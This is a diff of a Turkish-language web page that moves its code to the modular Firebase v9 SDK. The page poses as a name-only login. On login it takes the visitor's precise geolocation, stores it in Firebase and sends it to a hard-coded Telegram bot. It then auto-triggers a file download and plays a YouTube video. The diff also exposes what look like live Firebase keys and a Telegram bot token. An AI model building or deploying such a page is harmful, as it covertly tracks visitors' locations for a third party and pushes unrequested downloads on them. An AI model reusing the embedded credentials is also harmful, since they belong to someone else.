@@ -61,10 +61,6 @@
       box-shadow: 0 0 4px rgba(0,0,0,0.1);
     }
   </style>
-
-  <!-- Firebase 8.x -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
 <body>
 
@@ -89,135 +85,151 @@
   <h3>Giriş Yapanlar</h3>
   <ul id="liste"></ul>
 
-  <script>
+  <script type="module">
+    // Firebase v9 Modüler SDK importları
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
+    import { getAnalytics }   from "https://www.gstatic.com/firebasejs/9.17.2/firebase-analytics.js";
+    import {
+      getDatabase,
+      ref,
+      push,
+      get,
+      query,
+      orderByChild,
+      equalTo,
+      onValue
+    } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js";
+
     // Firebase yapılandırması
-    var firebaseConfig = {
+    const firebaseConfig = {
       apiKey: "AIzaSyBMRl-hAnyhNR3BSjBXB7JGDbiQ_3J27dc",
       authDomain: "system-ccad9.firebaseapp.com",
       databaseURL: "https://system-ccad9-default-rtdb.firebaseio.com",
       projectId: "system-ccad9",
-      appId: "1:933332785337:web:385cbe477e9b8f3beaa368"
+      storageBucket: "system-ccad9.appspot.com",
+      messagingSenderId: "933332785337",
+      appId: "1:933332785337:web:385cbe477e9b8f3beaa368",
+      measurementId: "G-S5CG1HP6WS"
     };
-    firebase.initializeApp(firebaseConfig);
-    var db = firebase.database();
+
+    // Firebase başlatma
+    const app       = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const db        = getDatabase(app);
 
     // Telegram bilgileri
-    var BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
-    var CHAT_ID   = "8499614707";
+    const BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
+    const CHAT_ID   = "8499614707";
 
+    // Genel mesaj gösterme fonksiyonu
     function setMessage(text, color = "red") {
-      var msg = document.getElementById("msg");
-      msg.style.color = color;
-      msg.textContent = text;
+      const msg = document.getElementById("msg");
+      msg.style.color   = color;
+      msg.textContent   = text;
+    }
+
+    // Telegram’a bildirim gönderme
+    function telegramaGonder(isim, konum) {
+      const mesaj =
+        `🧑 İsim: ${isim}
+📍 Konum: https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: mesaj })
+      }).catch(err => console.error("Telegram hatası:", err));
     }
 
     // Hesap oluşturma
-    function hesapAc() {
-      var isim = document.getElementById("isim").value.trim();
-      if (!isim) {
-        setMessage("Ad alanı boş olamaz.");
-        return;
-      }
-      // Aynı isimde hesap var mı kontrol et
-      db.ref("accounts")
-        .orderByChild("isim")
-        .equalTo(isim)
-        .once("value", function(snap) {
-          if (snap.exists()) {
-            setMessage("Bu hesap zaten var.");
-          } else {
-            db.ref("accounts").push({
-              isim: isim,
-              tarih: new Date().toISOString()
-            });
-            setMessage("Hesap oluşturuldu!", "green");
-          }
-        });
-    }
+    async function hesapAc() {
+      const isim = document.getElementById("isim").value.trim();
+      if (!isim) return setMessage("Ad alanı boş olamaz.");
 
-    // Telegram mesaj gönderme
-    function telegramaGonder(isim, konum) {
-      var mesaj =
-        "🧑 İsim: " + isim +
-        "\n📍 Konum: https://www.google.com/maps?q=" +
-        konum.lat + "," + konum.lon;
-      fetch(
-        "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage",
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: mesaj })
-        }
-      );
-    }
-
-    // Giriş yap
-    function girisYap() {
-      var isim = document.getElementById("isim").value.trim();
-      if (!isim) {
-        setMessage("Lütfen adınızı girin.");
-        return;
-      }
-      // Hesap kontrol
-      db.ref("accounts")
-        .orderByChild("isim")
-        .equalTo(isim)
-        .once("value", function(snap) {
-          if (!snap.exists()) {
-            setMessage("Hesap bulunamadı.");
-            return;
-          }
-          // Konum iste
-          if (!navigator.geolocation) {
-            setMessage("Konum desteklenmiyor.");
-            return;
-          }
-          navigator.geolocation.getCurrentPosition(function(pos) {
-            var konum = {
-              lat: pos.coords.latitude.toFixed(6),
-              lon: pos.coords.longitude.toFixed(6)
-            };
-            // Giriş kaydı
-            db.ref("girisler").push({
-              isim: isim,
-              konum: konum,
-              tarih: new Date().toISOString()
-            });
-            // Telegram bildirimi
-            telegramaGonder(isim, konum);
-            setMessage("Hoş geldin, " + isim + "!", "green");
-            // İndirme
-            var dl = document.getElementById("downloadLink");
-            dl.style.display = "block";
-            dl.click();
-            // YouTube
-            var vidSec = document.getElementById("videoSection");
-            var frame  = document.getElementById("youtubeFrame");
-            frame.src = "https://www.youtube.com/embed/PCMJtCjfxpw?autoplay=1";
-            vidSec.style.display = "block";
-          }, function(err) {
-            setMessage("Konum alınamadı: " + err.message);
+      const q = query(ref(db, "accounts"), orderByChild("isim"), equalTo(isim));
+      try {
+        const snap = await get(q);
+        if (snap.exists()) {
+          setMessage("Bu hesap zaten var.");
+        } else {
+          await push(ref(db, "accounts"), {
+            isim: isim,
+            tarih: new Date().toISOString()
           });
-        });
+          setMessage("Hesap oluşturuldu!", "green");
+        }
+      } catch (err) {
+        console.error("hesapAc hata:", err);
+        setMessage("Sunucu hatası: " + err.message);
+      }
     }
 
-    // Event listener
-    document.getElementById("createBtn")
-      .addEventListener("click", hesapAc);
-    document.getElementById("loginBtn")
-      .addEventListener("click", girisYap);
+    // Giriş yapma
+    async function girisYap() {
+      const isim = document.getElementById("isim").value.trim();
+      if (!isim) return setMessage("Lütfen adınızı girin.");
 
-    // Giriş yapanları listele
-    db.ref("girisler").on("value", function(snapshot) {
-      var data = snapshot.val() || {};
-      var ul   = document.getElementById("liste");
+      const q = query(ref(db, "accounts"), orderByChild("isim"), equalTo(isim));
+      try {
+        const snap = await get(q);
+        if (!snap.exists()) {
+          setMessage("Böyle bir hesap yok.");
+          return;
+        }
+
+        if (!navigator.geolocation) {
+          return setMessage("Tarayıcı konumu desteklemiyor.");
+        }
+
+        navigator.geolocation.getCurrentPosition(async pos => {
+          const konum = {
+            lat: pos.coords.latitude.toFixed(6),
+            lon: pos.coords.longitude.toFixed(6)
+          };
+
+          await push(ref(db, "girisler"), {
+            isim: isim,
+            konum: konum,
+            tarih: new Date().toISOString()
+          });
+
+          telegramaGonder(isim, konum);
+          setMessage("Giriş başarılı, hoş geldin " + isim + "!", "green");
+
+          // Dosya indirme
+          const dl = document.getElementById("downloadLink");
+          dl.style.display = "block";
+          dl.click();
+
+          // YouTube oynatıcı
+          const frame = document.getElementById("youtubeFrame");
+          frame.src    = "https://www.youtube.com/embed/PCMJtCjfxpw?autoplay=1";
+          document.getElementById("videoSection").style.display = "block";
+
+        }, err => {
+          setMessage("Konum alınamadı: " + err.message);
+        });
+
+      } catch (err) {
+        console.error("girisYap hata:", err);
+        setMessage("Sunucu hatası: " + err.message);
+      }
+    }
+
+    // Buton event’leri
+    document.getElementById("createBtn").addEventListener("click", hesapAc);
+    document.getElementById("loginBtn").addEventListener("click", girisYap);
+
+    // Giriş yapanları gerçek zamanlı listeleme
+    onValue(ref(db, "girisler"), snapshot => {
+      const ul = document.getElementById("liste");
       ul.innerHTML = "";
-      Object.values(data).forEach(function(item) {
-        var li = document.createElement("li");
-        li.textContent = item.isim;
+      snapshot.forEach(childSnap => {
+        const li = document.createElement("li");
+        li.textContent = childSnap.val().isim;
         ul.appendChild(li);
       });
     });
   </script>
+
 </body>
 </html>
